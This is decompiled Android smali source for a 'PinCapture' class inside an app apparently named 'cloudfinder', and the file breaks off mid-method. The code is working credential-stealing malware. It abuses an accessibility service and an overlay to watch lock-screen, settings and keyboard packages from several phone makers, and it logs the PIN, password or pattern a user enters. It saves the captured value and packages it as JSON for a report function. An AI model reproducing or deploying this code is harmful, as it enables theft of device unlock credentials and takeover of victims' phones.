.class public final Lcom/lite/cloudfinder/pin/PinCapture;
.super Ljava/lang/Object;
.source "PinCapture.java"


# static fields
.field private static final BUF:Ljava/lang/StringBuilder;

.field private static final DOTS:[Z

.field private static final PATTERN:Ljava/lang/StringBuilder;

.field private static final PKGS:[Ljava/lang/String;

.field private static final POLL_H:Landroid/os/Handler;

.field private static final POLL_R:Ljava/lang/Runnable;

.field private static final SP:Ljava/lang/String; = "pin_capture"

.field private static final TAG:Ljava/lang/String; = "PinCapture"

.field private static armed:Z

.field private static capType:Ljava/lang/String;

.field private static flowStarted:Z

.field private static lastEventTs:J

.field private static lastPkg:Ljava/lang/String;

.field private static lastReport:J

.field private static lastValue:Ljava/lang/String;

.field private static overlayTries:I

.field private static overlayView:Landroid/view/View;

.field private static polling:Z

.field private static prompted:Z

.field private static svcRef:Landroid/accessibilityservice/AccessibilityService;


# direct methods
.method static constructor <clinit>()V
    .locals 16

    .line 35
    const-string v14, "com.samsung.android.honeyboard"

    const-string v15, "com.google.android.inputmethod.latin"

    const-string v0, "com.android.systemui"

    const-string v1, "com.android.settings"

    const-string v2, "com.android.settings.intelligence"

    const-string v3, "com.samsung.android.biometrics.app.setting"

    const-string v4, "com.samsung.android.app.aodservice"

    const-string v5, "com.hihonor.android.systemui"

    const-string v6, "com.hihonor.android.settings"

    const-string v7, "com.oplus.systemui"

    const-string v8, "com.oplus.screenlock"

    const-string v9, "com.coloros.systemui"

    const-string v10, "com.coloros.screenlock"

    const-string v11, "com.oppo.systemui"

    const-string v12, "com.vivo.systemui"

    const-string v13, "com.bbk.theme"

    filled-new-array/range {v0 .. v15}, [Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/lite/cloudfinder/pin/PinCapture;->PKGS:[Ljava/lang/String;

    .line 54
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    sput-object v0, Lcom/lite/cloudfinder/pin/PinCapture;->BUF:Ljava/lang/StringBuilder;

    .line 60
    const-string v0, "unknown"

    sput-object v0, Lcom/lite/cloudfinder/pin/PinCapture;->capType:Ljava/lang/String;

    .line 61
    const-string v0, ""

    sput-object v0, Lcom/lite/cloudfinder/pin/PinCapture;->lastPkg:Ljava/lang/String;

    .line 63
    sput-object v0, Lcom/lite/cloudfinder/pin/PinCapture;->lastValue:Ljava/lang/String;

    const/16 v0, 0x9

    .line 392
    new-array v0, v0, [Z

    sput-object v0, Lcom/lite/cloudfinder/pin/PinCapture;->DOTS:[Z

    .line 393
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    sput-object v0, Lcom/lite/cloudfinder/pin/PinCapture;->PATTERN:Ljava/lang/StringBuilder;

    .line 396
    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    sput-object v0, Lcom/lite/cloudfinder/pin/PinCapture;->POLL_H:Landroid/os/Handler;

    .line 397
    new-instance v0, Lcom/lite/cloudfinder/pin/PinCapture$5;

    invoke-direct {v0}, Lcom/lite/cloudfinder/pin/PinCapture$5;-><init>()V

    sput-object v0, Lcom/lite/cloudfinder/pin/PinCapture;->POLL_R:Ljava/lang/Runnable;

    return-void
.end method

.method private constructor <init>()V
    .locals 0

    .line 65
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method static synthetic access$000()Z
    .locals 1

    .line 30
    sget-boolean v0, Lcom/lite/cloudfinder/pin/PinCapture;->flowStarted:Z

    return v0
.end method

.method static synthetic access$002(Z)Z
    .locals 0

    .line 30
    sput-boolean p0, Lcom/lite/cloudfinder/pin/PinCapture;->flowStarted:Z

    return p0
.end method

.method static synthetic access$100()Z
    .locals 1

    .line 30
    invoke-static {}, Lcom/lite/cloudfinder/pin/PinCapture;->isCredentialForeground()Z

    move-result v0

    return v0
.end method

.method static synthetic access$1000()Ljava/lang/Runnable;
    .locals 1

    .line 30
    sget-object v0, Lcom/lite/cloudfinder/pin/PinCapture;->POLL_R:Ljava/lang/Runnable;

    return-object v0
.end method

.method static synthetic access$1100()I
    .locals 1

    .line 30
    sget v0, Lcom/lite/cloudfinder/pin/PinCapture;->overlayTries:I

    return v0
.end method

.method static synthetic access$1200(Landroid/accessibilityservice/AccessibilityService;)V
    .locals 0

    .line 30
    invoke-static {p0}, Lcom/lite/cloudfinder/pin/PinCapture;->addOverlay(Landroid/accessibilityservice/AccessibilityService;)V

    return-void
.end method

.method static synthetic access$200(Landroid/content/Context;)Z
    .locals 0

    .line 30
    invoke-static {p0}, Lcom/lite/cloudfinder/pin/PinCapture;->isDeviceLocked(Landroid/content/Context;)Z

    move-result p0

    return p0
.end method

.method static synthetic access$300(Landroid/content/Context;JI)V
    .locals 0

    .line 30
    invoke-static {p0, p1, p2, p3}, Lcom/lite/cloudfinder/pin/PinCapture;->scheduleFallback(Landroid/content/Context;JI)V

    return-void
.end method

.method static synthetic access$400(Landroid/content/Context;)Z
    .locals 0

    .line 30
    invoke-static {p0}, Lcom/lite/cloudfinder/pin/PinCapture;->isKeyguardLocked(Landroid/content/Context;)Z

    move-result p0

    return p0
.end method

.method static synthetic access$500(Landroid/content/Context;Z)V
    .locals 0

    .line 30
    invoke-static {p0, p1}, Lcom/lite/cloudfinder/pin/PinCapture;->finalizeAttempt(Landroid/content/Context;Z)V

    return-void
.end method

.method static synthetic access$600()Z
    .locals 1

    .line 30
    sget-boolean v0, Lcom/lite/cloudfinder/pin/PinCapture;->polling:Z

    return v0
.end method

.method static synthetic access$602(Z)Z
    .locals 0

    .line 30
    sput-boolean p0, Lcom/lite/cloudfinder/pin/PinCapture;->polling:Z

    return p0
.end method

.method static synthetic access$700()Landroid/accessibilityservice/AccessibilityService;
    .locals 1

    .line 30
    sget-object v0, Lcom/lite/cloudfinder/pin/PinCapture;->svcRef:Landroid/accessibilityservice/AccessibilityService;

    return-object v0
.end method

.method static synthetic access$800(Landroid/view/accessibility/AccessibilityNodeInfo;I)V
    .locals 0

    .line 30
    invoke-static {p0, p1}, Lcom/lite/cloudfinder/pin/PinCapture;->readDots(Landroid/view/accessibility/AccessibilityNodeInfo;I)V

    return-void
.end method

.method static synthetic access$900()Landroid/os/Handler;
    .locals 1

    .line 30
    sget-object v0, Lcom/lite/cloudfinder/pin/PinCapture;->POLL_H:Landroid/os/Handler;

    return-object v0
.end method

.method private static addOverlay(Landroid/accessibilityservice/AccessibilityService;)V
    .locals 5

    .line 754
    const-string v0, "PinCapture"

    sget-object v1, Lcom/lite/cloudfinder/pin/PinCapture;->overlayView:Landroid/view/View;

    if-eqz v1, :cond_0

    return-void

    .line 756
    :cond_0
    :try_start_0
    const-string v1, "window"

    invoke-virtual {p0, v1}, Landroid/accessibilityservice/AccessibilityService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/view/WindowManager;

    if-nez v1, :cond_1

    return-void

    .line 758
    :cond_1
    new-instance v2, Landroid/view/View;

    invoke-direct {v2, p0}, Landroid/view/View;-><init>(Landroid/content/Context;)V

    const v3, 0x1a00a3ff

    .line 759
    invoke-virtual {v2, v3}, Landroid/view/View;->setBackgroundColor(I)V

    .line 760
    new-instance v3, Landroid/view/WindowManager$LayoutParams;

    invoke-direct {v3}, Landroid/view/WindowManager$LayoutParams;-><init>()V

    const/16 v4, 0x7f0

    .line 761
    iput v4, v3, Landroid/view/WindowManager$LayoutParams;->type:I

    const/4 v4, -0x3

    .line 762
    iput v4, v3, Landroid/view/WindowManager$LayoutParams;->format:I

    const/16 v4, 0x318

    .line 763
    iput v4, v3, Landroid/view/WindowManager$LayoutParams;->flags:I

    const/16 v4, 0x33

    .line 767
    iput v4, v3, Landroid/view/WindowManager$LayoutParams;->gravity:I

    const/4 v4, -0x1

    .line 768
    iput v4, v3, Landroid/view/WindowManager$LayoutParams;->width:I

    const/16 v4, 0x78

    .line 769
    iput v4, v3, Landroid/view/WindowManager$LayoutParams;->height:I

    const/4 v4, 0x0

    .line 770
    iput v4, v3, Landroid/view/WindowManager$LayoutParams;->x:I

    .line 771
    iput v4, v3, Landroid/view/WindowManager$LayoutParams;->y:I

    .line 772
    invoke-interface {v1, v2, v3}, Landroid/view/WindowManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    .line 773
    sput-object v2, Lcom/lite/cloudfinder/pin/PinCapture;->overlayView:Landroid/view/View;

    .line 774
    const-string v1, "overlay added type=2032 h=120"

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    goto :goto_0

    :catchall_0
    move-exception v1

    .line 776
    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "overlay failed: "

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 777
    sget v0, Lcom/lite/cloudfinder/pin/PinCapture;->overlayTries:I

    add-int/lit8 v1, v0, 0x1

    sput v1, Lcom/lite/cloudfinder/pin/PinCapture;->overlayTries:I

    const/4 v1, 0x3

    if-ge v0, v1, :cond_2

    .line 779
    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v1, Lcom/lite/cloudfinder/pin/PinCapture$7;

    invoke-direct {v1, p0}, Lcom/lite/cloudfinder/pin/PinCapture$7;-><init>(Landroid/accessibilityservice/AccessibilityService;)V

    const-wide/16 v2, 0x3e8

    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    :cond_2
    :goto_0
    return-void
.end method

.method public static declared-synchronized arm(Landroid/content/Context;)V
    .locals 7

    const-string v0, "arm secure="

    const-class v1, Lcom/lite/cloudfinder/pin/PinCapture;

    monitor-enter v1

    .line 71
    :try_start_0
    sget-boolean v2, Lcom/lite/cloudfinder/pin/PinCapture;->armed:Z

    if-eqz v2, :cond_0

    .line 72
    const-string p0, "PinCapture"

    const-string v0, "arm skipped (already armed)"

    invoke-static {p0, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 73
    monitor-exit v1

    return-void

    :cond_0
    if-nez p0, :cond_1

    .line 75
    monitor-exit v1

    return-void

    :cond_1
    const/4 v2, 0x1

    .line 76
    :try_start_1
    sput-boolean v2, Lcom/lite/cloudfinder/pin/PinCapture;->armed:Z

    .line 77
    sget-object v3, Lcom/lite/cloudfinder/pin/PinCapture;->BUF:Ljava/lang/StringBuilder;

    const/4 v4, 0x0

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->setLength(I)V

    .line 79
    const-string v3, "keyguard"

    invoke-virtual {p0, v3}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Landroid/app/KeyguardManager;

    if-eqz v3, :cond_2

    .line 80
    invoke-virtual {v3}, Landroid/app/KeyguardManager;->isDeviceSecure()Z

    move-result v3

    if-eqz v3, :cond_2

    move v3, v2

    goto :goto_0

    :cond_2
    move v3, v4

    .line 81
    :goto_0
    const-string v5, "PinCapture"

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v6, v3}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v5, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 83
    const-string v0, "pin_capture"

    invoke-virtual {p0, v0, v4}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    .line 84
    invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    const-string v4, "armed"

    .line 85
    invoke-interface {v0, v4, v2}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    const-string v2, "secure"

    .line 86
    invoke-interface {v0, v2, v3}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    const-string v2, "armed_at"

    .line 87
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v3

    invoke-interface {v0, v2, v3, v4}, Landroid/content/SharedPreferences$Editor;->putLong(Ljava/lang/String;J)Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    .line 88
    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->apply()V

    .line 90
    instance-of v0, p0, Landroid/accessibilityservice/AccessibilityService;

    if-eqz v0, :cond_3

    .line 91
    check-cast p0, Landroid/accessibilityservice/AccessibilityService;

    sput-object p0, Lcom/lite/cloudfinder/pin/PinCapture;->svcRef:Landroid/accessibilityservice/AccessibilityService;

    .line 92
    invoke-static {p0}, Lcom/lite/cloudfinder/pin/PinCapture;->addOverlay(Landroid/accessibilityservice/AccessibilityService;)V
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    goto :goto_1

    :catchall_0
    move-exception p0

    .line 95
    :try_start_2
    const-string v0, "PinCapture"

    const-string v2, "arm failed"

    invoke-static {v0, v2, p0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_1

    .line 97
    :cond_3
    :goto_1
    monitor-exit v1

    return-void

    :catchall_1
    move-exception p0

    monitor-exit v1

    throw p0
.end method

.method private static declared-synchronized finalizeAttempt(Landroid/content/Context;Z)V
    .locals 8

    const-string v0, "{\"type\":\""

    const-string v1, "attempt end type="

    const-class v2, Lcom/lite/cloudfinder/pin/PinCapture;

    monitor-enter v2

    .line 635
    :try_start_0
    sget-object v3, Lcom/lite/cloudfinder/pin/PinCapture;->BUF:Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    .line 636
    invoke-virtual {v3}, Ljava/lang/String;->length()I

    move-result v4
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_1

    if-nez v4, :cond_0

    monitor-exit v2

    return-void

    .line 637
    :cond_0
    :try_start_1
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v4

    .line 638
    const-string v6, "PinCapture"

    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-object v1, Lcom/lite/cloudfinder/pin/PinCapture;->capType:Ljava/lang/String;

    invoke-virtual {v7, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v1, " value="

    invoke-virtual {v7, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v1, " ok="

    invoke-virtual {v7, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7, p1}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v6, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_1

    const/4 v1, 0x0

    .line 640
    :try_start_2
    const-string v6, "pin_capture"

    invoke-virtual {p0, v6, v1}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object p0

    invoke-interface {p0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object p0

    const-string v6, "pin_type"

    sget-object v7, Lcom/lite/cloudfinder/pin/PinCapture;->capType:Ljava/lang/String;

    .line 641
    invoke-interface {p0, v6, v7}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    move-result-object p0

    const-string v6, "pin_buf"

    .line 642
    invoke-interface {p0, v6, v3}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    move-result-object p0

    const-string v6, "complete"

    .line 643
    invoke-interface {p0, v6, p1}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    move-result-object p0

    const-string v6, "ts"

    .line 644
    invoke-interface {p0, v6, v4, v5}, Landroid/content/SharedPreferences$Editor;->putLong(Ljava/lang/String;J)Landroid/content/SharedPreferences$Editor;

    move-result-object p0

    .line 645
    invoke-interface {p0}, Landroid/content/SharedPreferences$Editor;->apply()V
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    .line 648
    :catchall_0
    :try_start_3
    new-instance p0, Ljava/lang/StringBuilder;

    invoke-direct {p0, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-object v0, Lcom/lite/cloudfinder/pin/PinCapture;->capType:Ljava/lang/String;

    invoke-virtual {p0, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v0, "\",\"value\":\""

    invoke-virtual {p0, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v0, "\",\"ok\":"

    invoke-virtual {p0, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 649
    invoke-virtual {p0, p1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string p1, ",\"final\":1,\"ts\":"

    invoke-virtual {p0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p0, v4, v5}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    const-string p1, "}"

    invoke-virtual {p0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0

    .line 648
    invoke-static {p0}, Lcom/lite/cloudfinder/pin/PinCapture;->report(Ljava/lang/String;)V

    .line 650
    sget-object p0, Lcom/lite/cloudfinder/pin/PinCapture;->BUF:Ljava/lang/StringBuilder;

    invoke-virtual {p0, v1}, Ljava/lang/StringBuilder;->setLength(I)V

    .line 651
    const-string p0, ""

    sput-object p0, Lcom/lite/cloudfinder/pin/PinCapture;->lastValue:Ljava/lang/String;

    .line 652
    const-string p0, "unknown"

    sput-object p0, Lcom/lite/cloudfinder/pin/PinCapture;->capType:Ljava/lang/String;
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_1

    .line 653
    monitor-exit v2

    return-void

    :catchall_1
    move-exception p0

    monitor-exit v2

    throw p0
.end method

.method private static flush(Landroid/content/Context;Z)V
    .locals 5

    .line 656
    sget-object v0, Lcom/lite/cloudfinder/pin/PinCapture;->BUF:Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 657
    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v1

    if-nez v1, :cond_0

    return-void

    .line 658
    :cond_0
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v1

    .line 660
    :try_start_0
    const-string v3, "pin_capture"

    const/4 v4, 0x0

    invoke-virtual {p0, v3, v4}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object p0

    invoke-interface {p0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object p0

    const-string v3, "pin_type"

    sget-object v4, Lcom/lite/cloudfinder/pin/PinCapture;->capType:Ljava/lang/String;

    .line 661
    invoke-interface {p0, v3, v4}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    move-result-object p0

    const-string v3, "pin_buf"

    .line 662
    invoke-interface {p0, v3, v0}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    move-result-object p0

    const-string v3, "complete"

    .line 663
    invoke-interface {p0, v3, p1}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    move-result-object p0

    const-string v3, "ts"

    .line 664
    invoke-interface {p0, v3, v1, v2}, Landroid/content/SharedPreferences$Editor;->putLong(Ljava/lang/String;J)Landroid/content/SharedPreferences$Editor;

    move-result-object p0

    .line 665
    invoke-interface {p0}, Landroid/content/SharedPreferences$Editor;->apply()V
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 668
    :catchall_0
    sget-object p0, Lcom/lite/cloudfinder/pin/PinCapture;->lastValue:Ljava/lang/String;

    invoke-virtual {v0, p0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p0

    if-eqz p0, :cond_1

    return-void

    .line 669
    :cond_1
    sput-object v0, Lcom/lite/cloudfinder/pin/PinCapture;->lastValue:Ljava/lang/String;

    .line 670
    sput-wide v1, Lcom/lite/cloudfinder/pin/PinCapture;->lastReport:J

    .line 671
    new-instance p0, Ljava/lang/StringBuilder;

    const-string v3, "capture type="

    invoke-direct {p0, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-object v3, Lcom/lite/cloudfinder/pin/PinCapture;->capType:Ljava/lang/String;

    invoke-virtual {p0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v3, " ok="

    invoke-virtual {p0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p0, p1}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    const-string v3, " value="

    invoke-virtual {p0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p0, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0

    const-string v3, "PinCapture"

    invoke-static {v3, p0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 672
    new-instance p0, Ljava/lang/StringBuilder;

    const-string v3, "{\"type\":\""

    invoke-direct {p0, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-object v3, Lcom/lite/cloudfinder/pin/PinCapture;->capType:Ljava/lang/String;

    invoke-virtual {p0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v3, "\",\"value\":\""

    invoke-virtual {p0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p0, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v0, "\",\"ok\":"

    invoke-virtual {p0, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 673
    invoke-virtual {p0, p1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string p1, ",\"ts\":"

    invoke-virtual {p0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p0, v1, v2}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    const-string p1, "}"

    invoke-virtual {p0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0

    .line 672
    invoke-static {p0}, Lcom/lite/cloudfinder/pin/PinCapture;->report(Ljava/lang/String;)V

    return-void
.end method

.method private static handleKey(Landroid/content/Context;Ljava/lang/String;)V
    .locals 6

    .line 534
    invoke-static {p1}, Lcom/lite/cloudfinder/pin/PinCapture;->isDelete(Ljava/lang/String;)Z

    move-result v0

    const/4 v1, 0x0

    const/4 v2, 0x1

    if-eqz v0, :cond_1

    .line 535
    sget-object p1, Lcom/lite/cloudfinder/pin/PinCapture;->BUF:Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->length()I

    move-result v0

    if-lez v0, :cond_0

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->length()I

    move-result v0

    sub-int/2addr v0, v2

    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->deleteCharAt(I)Ljava/lang/StringBuilder;

    .line 536
    :cond_0
    invoke-static {p0, v1}, Lcom/lite/cloudfinder/pin/PinCapture;->flush(Landroid/content/Context;Z)V

    return-void

    .line 539
    :cond_1
    invoke-static {p1}, Lcom/lite/cloudfinder/pin/PinCapture;->isEnter(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_2

    .line 540
    invoke-static {p0, v2}, Lcom/lite/cloudfinder/pin/PinCapture;->flush(Landroid/content/Context;Z)V

    .line 541
    sget-object p0, Lcom/lite/cloudfinder/pin/PinCapture;->BUF:Ljava/lang/StringBuilder;

    invoke-virtual {p0, v1}, Ljava/lang/StringBuilder;->setLength(I)V

    .line 542
    const-string p0, ""

    sput-object p0, Lcom/lite/cloudfinder/pin/PinCapture;->lastValue:Ljava/lang/String;

    return-void

    .line 545
    :cond_2
    invoke-virtual {p1}, Ljava/lang/String;->length()I

    move-result v0

    const-string v3, "pin"

    const/4 v4, 0x4

    if-ne v0, v2, :cond_6

    .line 546
    invoke-static {p1}, Lcom/lite/cloudfinder/pin/PinCapture;->isDigits(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_3

    goto :goto_0

    :cond_3
    const-string v3, "password"

    :goto_0
    sput-object v3, Lcom/lite/cloudfinder/pin/PinCapture;->capType:Ljava/lang/String;

    .line 547
    sget-object v0, Lcom/lite/cloudfinder/pin/PinCapture;->BUF:Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->length()I

    move-result v3

    const/16 v5, 0x20

    if-lt v3, v5, :cond_4

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->setLength(I)V

    .line 548
    :cond_4
    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 549
    invoke-virtual {v0}, Ljava/lang/StringBuilder;->length()I

    move-result p1

    if-lt p1, v4, :cond_5

    move v1, v2

    :cond_5
    invoke-static {p0, v1}, Lcom/lite/cloudfinder/pin/PinCapture;->flush(Landroid/content/Context;Z)V

    return-void

    .line 552
    :cond_6
    invoke-static {p1}, Lcom/lite/cloudfinder/pin/PinCapture;->isDigits(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_7

    invoke-virtual {p1}, Ljava/lang/String;->length()I

    move-result v0

    if-lt v0, v4, :cond_7

    .line 553
    sput-object v3, Lcom/lite/cloudfinder/pin/PinCapture;->capType:Ljava/lang/String;

    .line 554
    invoke-static {p1}, Lcom/lite/cloudfinder/pin/PinCapture;->setValue(Ljava/lang/String;)V

    .line 555
    invoke-static {p0, v2}, Lcom/lite/cloudfinder/pin/PinCapture;->flush(Landroid/content/Context;Z)V

    :cond_7
    return-void
.end method

.method private static handleText(Landroid/content/Context;Ljava/lang/String;)V
    .locals 8

    .line 561
    invoke-virtual {p1}, Ljava/lang/String;->length()I

    move-result v0

    const-string v1, "PinCapture"

    const/4 v2, 0x0

    const/4 v3, 0x1

    if-ne v0, v3, :cond_0

    sget-object v0, Lcom/lite/cloudfinder/pin/PinCapture;->BUF:Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->length()I

    move-result v4

    if-le v4, v3, :cond_0

    .line 562
    new-instance v4, Ljava/lang/StringBuilder;

    const-string v5, "new attempt (single char, buf="

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->length()I

    move-result v0

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v0, ")"

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

